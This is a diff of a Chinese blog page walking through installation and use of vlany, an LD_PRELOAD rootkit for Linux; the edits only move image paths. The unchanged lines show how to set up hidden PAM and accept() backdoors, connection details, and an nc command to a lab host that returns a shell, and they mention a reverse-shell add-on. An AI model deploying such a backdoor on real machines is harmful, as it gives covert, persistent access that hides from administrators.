@@ -110,21 +110,21 @@
 <meta property="og:site_name" content="Kionf">
 <meta property="og:description" content="此工具vlany通过LD_PRELOAD环境变量和/etc/ld.so.preload的配置文件来重写系统调用函数，加载攻击者自定义的恶意函数。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-01.jpg">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-02.jpg">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-03.jpg">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-04.jpg">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-05.jpg">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-06.jpg">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-07.jpg">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-08.jpg">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-09.jpg">
-<meta property="og:image" content="https://kionf.com/article_images/vlany-10.jpg">
-<meta property="og:updated_time" content="2018-10-31T10:19:28.319Z">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-01.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-02.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-03.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-04.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-05.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-06.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-07.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-08.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-09.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany/vlany-10.jpg">
+<meta property="og:updated_time" content="2018-11-21T08:55:38.825Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux动态链接库预加载型后门，Vlany安装及分析">
 <meta name="twitter:description" content="此工具vlany通过LD_PRELOAD环境变量和/etc/ld.so.preload的配置文件来重写系统调用函数，加载攻击者自定义的恶意函数。">
-<meta name="twitter:image" content="https://kionf.com/article_images/vlany-01.jpg">
+<meta name="twitter:image" content="https://kionf.com/article_images/vlany/vlany-01.jpg">
 
 
 
@@ -454,21 +454,21 @@
 <p>检验完SElinux，程序出现提示框选在grub配置位置，来确认当机器重启后 后门依然生效。根据机器实际情况填写，默认<code>/etc/grub.conf</code></p>
 <figure class="highlight sh"><div class="figcode"><div class="code"><pre><div class="line">Enter location of bootloader config file (<span class="keyword">if</span> grub2, config file is /boot/grub/grub.cfg) [/etc/grub.conf]:</div></pre></div></div></figure>
 <p>然后一路回车，等待<code>gcc</code>等依赖安装完成，出现如下界面。选择是编译并安装，还是只编译，我们这里选在<code>YES</code></p>
-<p><img src="https://kionf.com/article_images/vlany-01.jpg" alt="vlany-01"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-01.jpg" alt="vlany-01"></p>
 <h2 id="1-配置PAM后门"><a href="#1-配置PAM后门" class="headerlink" title="1. 配置PAM后门"></a>1. 配置PAM后门</h2><p>再一路回车，到如下界面。设置通过<code>ssh</code>连接的PAM用户名，<strong>记住此后门用户名</strong></p>
-<p><img src="https://kionf.com/article_images/vlany-02.jpg" alt="vlany-02"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-02.jpg" alt="vlany-02"></p>
 <p>然后设置PAM密码，这里输入密码不会回显任何东西，继续输入就ok</p>
-<p><img src="https://kionf.com/article_images/vlany-03.jpg" alt="vlany-03"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-03.jpg" alt="vlany-03"></p>
 <p>设置PAM端口，也是需要隐藏的端口</p>
-<p><img src="https://kionf.com/article_images/vlany-04.jpg" alt="vlany-04"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-04.jpg" alt="vlany-04"></p>
 <h2 id="2-配置accept-后门"><a href="#2-配置accept-后门" class="headerlink" title="2. 配置accept()后门"></a>2. 配置<code>accept()</code>后门</h2><p>设置连接是否使用<code>SSL</code>加密，这测试选择<code>NO</code></p>
-<p><img src="https://kionf.com/article_images/vlany-05.jpg" alt="vlany-05"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-05.jpg" alt="vlany-05"></p>
 <p>设置<code>accept()</code>后门密码，一样没有回显。</p>
-<p><img src="https://kionf.com/article_images/vlany-06.jpg" alt="vlany-06"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-06.jpg" alt="vlany-06"></p>
 <p>设置<code>accept()</code>后门隐藏端口</p>
-<p><img src="https://kionf.com/article_images/vlany-07.jpg" alt="vlany-07"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-07.jpg" alt="vlany-07"></p>
 <p>设置<code>execve()</code>密码，然后再再再一路回车，出现如下界面，是否删除编译项目的路径。</p>
-<p><img src="https://kionf.com/article_images/vlany-08.jpg" alt="vlany-08"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-08.jpg" alt="vlany-08"></p>
 <p>完成后，脚本会提示是否安装作者新研究的<code>snodew</code>后门这里选择<code>NO</code></p>
 <figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">Installation has finished. Would you like to setup the experimental snodew root reverse shell backdoor? (YES/NO) (<span class="keyword">case</span>-sensitive) [YES]:</div></pre></div></div></figure>
 <h2 id="3-连接信息"><a href="#3-连接信息" class="headerlink" title="3. 连接信息"></a>3. 连接信息</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#ssh连接PAM用户名</span></div><div class="line">PAM backdoor username: ***REMOVED***</div><div class="line"></div><div class="line"><span class="comment">#PAM端口</span></div><div class="line">Hidden PAM port: 4397</div><div class="line"></div><div class="line"><span class="comment">#accept后门随机端口号</span></div><div class="line">accept backdoor low port: 271</div><div class="line">accept backdoor high port: 274</div><div class="line"></div><div class="line"><span class="comment">#后门位置</span></div><div class="line">Hidden directory: /lib/libc.so.***REMOVED***.14</div><div class="line"></div><div class="line"><span class="comment">#变量</span></div><div class="line">Environment variable: UVRTBKAYCLWI</div></pre></div></div></figure>
@@ -479,9 +479,9 @@
 <p>使用其他机器连接后门，编辑文件<code>ssh.sh</code>。</p>
 <figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sh ssh.sh ***REMOVED*** 192.168.10.35 4397</div></pre></div></div></figure>
 <p>连接成功</p>
-<p><img src="https://kionf.com/article_images/vlany-09.jpg" alt="vlany-09"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-09.jpg" alt="vlany-09"></p>
 <p>在被攻击端查看是否有异常连接，完全隐藏没有显示出任何连接信息，并且查看<code>/etc/passwd</code>文件，没有我们所使用的<code>***REMOVED***</code>用户</p>
-<p><img src="https://kionf.com/article_images/vlany-10.jpg" alt="vlany-10"></p>
+<p><img src="https://kionf.com/article_images/vlany/vlany-10.jpg" alt="vlany-10"></p>
 <div class="note danger"><p>注意：<strong>如果不使用<code>ssh.sh</code>脚本连接pam后门，直接使用ssh连接。被攻击端会查看到ssh连接信息</strong></p>
 </div>
 <h2 id="2-accept-后门连接"><a href="#2-accept-后门连接" class="headerlink" title="2. accept()后门连接"></a>2. accept()后门连接</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#accept backdoor low port: 271</span></div><div class="line"><span class="comment">#accept backdoor high port: 274</span></div><div class="line"><span class="comment"># -p 指定 271-274 范围内端口</span></div><div class="line">nc 192.168.10.35 22 -p 271</div><div class="line"><span class="comment">#输入设定的accept密码后回车</span></div><div class="line">***REMOVED***</div><div class="line"> [+] shell dropped</div></pre></div></div></figure>
